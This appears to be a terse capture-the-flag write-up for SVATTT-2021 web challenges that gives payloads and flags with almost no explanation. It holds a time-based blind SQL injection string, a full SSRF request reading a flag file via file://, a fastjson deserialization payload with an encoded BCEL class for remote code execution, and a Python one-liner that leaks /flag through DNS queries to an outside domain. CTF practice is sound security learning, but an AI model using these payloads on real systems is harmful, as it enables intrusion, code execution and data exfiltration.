# SVATTT-2021

### Web 100:
Payload:
1 IF ((select substring(@@version,1,1))='M') WAITFOR DELAY '0:0:5' ELSE SELECT 1 order by USER

Flag: ssalchciwesmihcueymo...
### OProxy:
Payload:
```
POST /proxy HTTP/1.1
Host: 125.235.240.166:8000
Content-Length: 173
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://125.235.240.166:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://125.235.240.166:8000/proxy
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwlzjFuBDEIAMC_uE5hDBhznzmBASWKlEi7d1WUv99Gaaean3avI8_3dnscz3xr949ot7YGyEbJPmbSyEVchKUInX0zssoyjl61QMRZWCdvJ0wX0gERNXL2XBm8LJBiLSLy3GBiplg-OwtSGYjCYqNdIjPSJ7oAtyvyPPP43wDpBfs86v74_syvPwrtZFMcAeuqqs2tPup66BhhO8v72LP9vgDfWz9O.YWp8tQ.poE1UxeIwPV9U3P6bHoDceH7xM8; _ga=GA1.1.16254098.1634368731; _gid=GA1.1.1307224782.1634368731
Connection: close

csrf_token=IjFkOTA0YTY3YjMxM2Y3YzM5YTZjOWIyZjk2NTkyMmRhY2VmYjAyYzYi.YWuWOw.hQaY2D9nC_QvS6GH2kwmeiavSAA&url=file%3A%2F%2F127.0.0.1%2Fproc%2Fself%2Fcwd%2Fflag.txt&submit=Go%21
```
Flag: ASCIS{SSRF_M3mcached_inj3cti0n}
### ISOLATE:
Payload:
```
POST /search HTTP/1.1
Host: 167.172.85.253:8010
Content-Length: 4163
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://167.172.85.253:8010
Referer: http://167.172.85.253:8010/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=963B1F7188A889F56EBCFC81377D53A1
Connection: close

{{"\u0040type":"com.alibaba.fastjson.JSONObject","c":{"\u0040type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":{"\u0040type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$b5Vis$hU$W$3dO$96$dcJ$a7$ed$qr$ec$c4$Oq$gg$91lG$96$978$9bM$C$J$ce$e0$c1$8eC$94$F$t$E$d2n$b5$edv$e4nM$abe$S$86Y$99$Z$86$7d$f6a$87Y$c00$f3$F$f8$60$bbH1$cc7$aa$f8$l$fc$J$8a$o$9c$d7$92$r$d9V$aa$f8$82Tz$af$ef$7d$f7$9dw$ee$f2n$eb$cbo$3f$fd$l$80$B$fcGE7$ael$c2U$3c$W$c55$V$8f$e3$J$V$5d$b8$ae$c0P1$FS$K$Z9Xr$98V1$83$d9$u$ec$u$e6$e4$e3$N$a9$cc$w$98W$e0$a8$d8$86$xQ$b8r$ceE$f1$T9$7b$w$b6$o$l$85$af$a0$a0$a2$V$LrxR$O7$e5$f2$z$FO$v$f8$a9$8a$a7$f13$V$7b$f0s$V$ed$f8$85$i$7e$Z$c5$af$a2$f8u$U$cf$u$f8$8dd$f7$5b$Vq$fcN$c1$b3$K$7e$_P$3fl$3b$b6$7fB$a0$$$d1yI$m$7c$da$cdX$C$5b$c6l$c7$3a$5b$98$9f$b2$bc$L$c6T$96$9a$d8$98k$g$d9K$86gK$b9$a4$M$fb$b3v$9e$Yc$p$LvvH$a0$rqul$ceX0RY$c3$99IML$cdY$a6$3f$U$c0$g$de$cc$82$40S$8de$Bu$e4$a6i$e5$7c$dbu$88$V$9d$c8Y$9e$e1$bb$k$Z$99$f3$ZypeK$da$f7lg$86$5b$on$ce$v$cc$L$88Q$81$86$b4o$987$c6$8d$5c$89$94$ba$8a$f0D$af$40sb$e3vI$a8b$d4$c7$83$3c$cb$X$d8ZV$V$9c$h$8e$fb$a4$p$b0$f9$9cg$_$Y$be5r$d32$F$O$d4$c2$aa$c5$$$94$9b$Sh$abZ9$e7$b9$a6$95$cf$9f$w$d8$d9$8c$e5$d1B$e4$Y$8c$8d$G$5ci$dd$AX$d9$V$b2$c9ig$d1$c0vS$a7$K$d3$d3$96ge$ce$5bFq$3d$9ce$d6Xn$y$R$F$cf$b1$90$82$a2x$9eA$j6$b3$a54$LF$a8$b9$ea$8cr$ec$87$d6$a5$a7$e4$8d$82$8b$ac$h$G$y$ed$W$3c$d3$3ac$cb$Qo$92$f9$ee$91$b6$g$O$o$a9$e0$F$N$_$e2$r$G$yo$3e$a5$dby$7d$96$bc$U$bc$ac$e1$V$9c$d0p$E$D$M$efzh$F$7f$d0$f0G$fcI$c3$7d$d2$e8$a4$i$k$90$60$7f$d6$f0$X$fcU$40IM$d9N$w$3fK$c7$93$a6$86$bf$e1$ef$gN$e1$b4$c0$ee$d5$I$8c$3a$LF$d6$ce$9c$ce$g$f9$7c$d9$R$81$jw$J$n3$ad$5eU5$bc$8a$d7$88y$8dO$af$e3$N$e9$B$e3$d2$c4$95$8b$c5$bc$ebAq$a9$d7T$G$fbn9$94$bb$de$d4$f0$W$de$d6$f0$O$de$95$e2$3fX$ff$b5S$c3$acV$Y$e7$K$3eIY$c6$7cq$8d$89$d2$f0O$fcK$o$fc$5b$O$efix$lo0Q$3c$5e$f4$K$b1$xw$cb$9fu$j$3di$ea$j$f6$7c$ce$f5$7c$3d$ef$9a7$y$7f$a84$f7$ccX$be$91$c9$d0$cfi7$R$bfn$g$be$9e$9a$ce$g3$fa$d3$ba$9b$d1$93$P$e8$dc$eb$eb7$fb$u$e7$ad$8c$k$cf$a7$f4$aeTj$sN$d9$f7$f4$q5$8f9R0$L$3e$P$e9K$k$ee$bb$de$9312$fdG$P$j$3d$92$Z$e8$l$3c$7ch$ba$3f30h$f6dzf$e7$e6f$7b$acB$fc$a0$7e$b4$b7$f3$879$ffp$7f$b2$bf$b7$f7$fb1$e8$60$dajT$b2$86E$bc$a4$e1$D$7c$c8$x$n$xuM$f1$V$db$8e$c0$b6$N$a9$5dE$93i$9a$a8$w$a7$ea$ca$bd$95$f7$z$f6$9d$3a$b7$e0$97$ef$R$ed$d9$t$9cRZ$87$aa$60$aa$d4$y$e7$9c$94$b2$ce$9a$a3G$j$df$9a$91$V$S$cd$Z$5e$de$a2x$97$9e5$baf$db$f9$82$e3$db$f3$b2$d91$f8e$a19Q$dd$8eJj$d9$X$ac$a0$7f$r$S5$eewg$cd$$To$e4r$96$c3$ee$9b$fc$5e$3d$af$d2$a2$a2$be$5bT$JlO$d4l$8e$z5Y$b0$r7$f1$be$d8$ks3$e2y$ae$b7$g$b5$dd$89$x5$uV$O$8c$e4$7d$c3$f3$d7$fb$5e$f1$q$9c$Y$95$e0$8d$8cS$d5$ddc$8fX$b5_$7b$v$b9cg$a2$e6B$40$b1$b2Tj$baR$h$e5zF$be0Y$X$96$c7$5cn$c9$V$f3$ce$d7$d2$F$cf0$ad5$98$d5$a5$d2y$J$f7$f2$b5$df$N$f9$89B$c8f$ca$b1$87$d2I$84$f8$E4t$zC$7c$82P$acn$J$e1$8f$a9$I$n$c5$b1$Ru$i$b7$p$8cfhhA$_$r$ad$b8$B$7d$e8$e7$y$c1$Gh$z$c1F$u$858o$92$60$dd$x$88$ac$Hj$rP$h$Z$ec$K$80Z$8a$c6$r$m$f9t$I$83$848$cc$e70$e785G$ca$e0$9fs$96$Y$Pv$d5$f5$ff$l$f5$xP$86w$fd$97$f2$60pF$f1$d3$g$Q$C$e2$5dai3$7ep$F$d1El$afH$9b$W$e5NU$f2$aa$LxuA$e5$b8$87c$H$f6a$3fct$80$fa8$Zu$e2$YW$ef$a3$e6$7eF$eb4$Z$f7$G$f6aj$U$i$e5j$88$bf$d5$t$f2$K$d8$83H$c7$f9$j$o$8f$e1$c0$a7$f07$d8$t$g$gBUn$a9$f2UTr$eb$nD$C$cam$x$d8$5c$ff$Z$ea$t$ebbZz2$ikHOF$ba$d2Kh$bc$5c$J$a2$g$it$88n$OVe$a2$z$a0$805$f8$t$cb$f8$d7$a8$93$bb$f6w$ad$f0$ef$d6ml$9d$bc$8dm$93$cb$88$c5$9a$96$b0$bd$9b$bfX3$87$r$b4$yc$c7$e7$eb$8e$3aFr$c7$abr$b5$bftT$E$3a$a3rlM$aeT$f9V$z$j$da$Rd$8a$u$f2$bc$d8$ce$S$b2$I$90$eb$D$d2$t$d7$ec$e4$eb$b6$b8S$d4C$7e$B$eb6Z$t7$c6c$Zm$e1$r$ec$g$p$ef$7b$c6$a5$p$db$E$96$b1$fb$ecm$b4$d3$af$3d$93$H$97$a0$_$e3$deet$i$P$b7$d2r$ef$f1Hk$e4$L$d4$_$o$96l$8dHg$f7q$b8$bcx$e7$ab$q$3d$fe$a8$5c$G$H$98$u$99$c2v$d6$f0$5e$9c$n$95$l$91$d4$YF1$8e$b3$98$c0$p$fc$5eG$3a$I$c5$89$o$c1R$u$dai$f9$60P$f9$7b$b9$e3$M$r$e9$c8$R$86$e7$nb$9f$a2v$U$3f$a6$a3$a3$b8$H$P$H$B$j$O$K$ae$ee$O$X$p$K$c6$U$8c$x8$ab$60B$c19$e0$h4R$d7X$8e$ce$p$bc$z$e7$cb$b7$f5$d9R2$f7D$8a$91$d9$_$ps$m$fd0s$hY$c4$e6$b1$eeO$90XB$e7$c74$df$82$s$s$z$5e$f2$af$z$e0$acP$bb$99$fa$ad$5ci$c0$OJ$ed$fcO$bf$9a$de$j$5cO$e3B$b0w$L$ab$ec$o$f5$92k$M$a1$3b4$Q$K$$$c9$e1$f2$d7$b4$Tx4$u$95$c9$ef$AD6$j$H$97$M$A$A"}}:"aaa"}
```
```python -c "import socket; socket.getaddrinfo('`cat /flag | od -A n -t x1 | sed 's/ *//g' | tr -d '\n' | cut -c1-61`.dad28487d32564f2d35c.d.hjjh.eu', 80)"```
Flag: ASCIS{howaboutw/oDNS?:>}
